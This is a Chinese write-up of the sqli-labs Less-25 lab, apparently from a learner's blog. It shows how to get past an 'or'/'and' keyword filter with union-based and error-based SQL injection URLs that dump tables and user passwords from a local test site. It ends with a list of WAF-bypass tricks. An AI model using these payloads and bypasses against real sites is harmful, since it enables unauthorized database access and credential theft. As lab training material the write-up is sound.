sql-labs-Less-25

进入http://127.0.0.1/sql/Less-25/，输入?id=1，正常输出。
再输入’，发生报错，从报错信息来看这关的注入字符是’，再输入–+进行注释，正常输出，说明可以用’注入。
输入http://127.0.0.1/sql/Less-25/?id=1' order by 3–+，发现报错：


发现报错语句中只有‘der by’，与我们输入的‘order by’不一样。
查看源代码：


发现对大小写的’or’和’and’进行了过滤，既输入的注入语句中的or和and会变为空。

方法一（联合注入）：
查列数：http://127.0.0.1/sql/Less-25/?id=1' oorrder by 3–+
测位置：http://127.0.0.1/sql/Less-25/?id=-1' union select 1,2,3–+
爆库：http://127.0.0.1/sql/Less-25/?id=-1' union select 1,database(),3–+（http://127.0.0.1/sql/Less-25/?id=-1' union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3–+）
爆表：http://127.0.0.1/sql/Less-25/?id=-1' union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+
爆列：http://127.0.0.1/sql/Less-25/?id=-1' union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+
爆数据：http://127.0.0.1/sql/Less-25/?id=-1' union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+

方法二（报错注入）：
爆库：http://127.0.0.1/sql/Less-25/?id=1'|| extractvalue(1,concat(0x7e,database()))–+
爆表：http://127.0.0.1/sql/Less-25/?id=1'|| extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+
爆列：http://127.0.0.1/sql/Less-25/?id=1'|| extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+
爆数据：http://127.0.0.1/sql/Less-25/?id=1'|| extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+
http://127.0.0.1/sql/Less-25/?id=1'|| extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+
http://127.0.0.1/sql/Less-25/?id=1'|| extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+
（这里不用group_concat函数是因为在报错语句在它的输出有字数限制(?)）

小结

WAF绕过
1.sql注释符绕过 （1） union /**/select 我们将union select之间的空格使用注释符进行替换（适用于对union select之间的空格进行检测的情况）
（2）union/*crow%0%32#*/select 我们在注释符中间填充内容
（3）union/*aaaaaaaaaabbbbbbbbbcccccccccccdddddddddddeeeeeeeeeeee%%%%%%%%%*/select 构造较大数据
（4）/*!union select*/内联注释 我们使用内联注释，mysql特有
2.空白符绕过
（1）mysql空白符：%09（TAB键（水平））；%0A（新建一行）; %0B（TAB键（垂直））; %0D（return功能）; %20（空格）; %0C（新的一页）; %A0（空格）; /*XXX*/
（2）正则空白符： %09；%0A; %0B; %0D; %20;
%25其实就是百分号 %25A0 就是空白符
3.函数分割符号
将一个函数进行分割concat()
%25其实就是百分号 %25A0 就是空白符
concat%2520(
concat/**/(
concat%250c(
concat%25a0(
4.浮点数法
waf对于id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测
5.利用error-based进行sql注入
extractvalue(1, concat(0x5c,md5(3)));
updatexml(1, concat(0x5d,md5(3)),1);
GeometryCollection((select*from(select*from(select@@version)f)x))
polygon((select*from(select name_const(version(),1))x))
linestring()
multipoint()
multilinestring()
multipolygon()
6.mysql特殊语法
select {x schema_name} from {x information_schema.schemata};
select {x 1};
7.大小写绕过
如果对关键字and、or、union等进行了过滤，可以考虑使用大小写混合的方法
Or aNd UniOn
但是很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法
8.关键字重复
OORr >> or (既Less-25的方法一)
9.关键字替换
如果还是无法绕过，可以考虑替换的方法
and >> && or >> ||(既Less-25的方法二) like可以替换 = <> 等价于 != --+、#可以替换为;%00
